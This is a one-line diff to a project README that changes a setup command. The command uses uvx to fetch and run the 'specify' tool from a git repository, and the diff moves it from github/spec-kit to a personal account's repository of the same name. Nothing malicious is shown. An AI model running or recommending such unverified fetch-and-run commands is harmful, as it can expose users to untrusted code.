@@ -74,7 +74,7 @@ Layer 1: Project Foundation (Discovery & planning)
 Initialize your project depending on the coding agent you're using:
 
 ```bash
-uvx --from git+https://github.com/github/spec-kit.git specify init <PROJECT_NAME>
+uvx --from git+https://github.com/Wavegoodvybe2929/spec-kit.git specify init <PROJECT_NAME>
 ```
 
 ### 2. Choose your approach
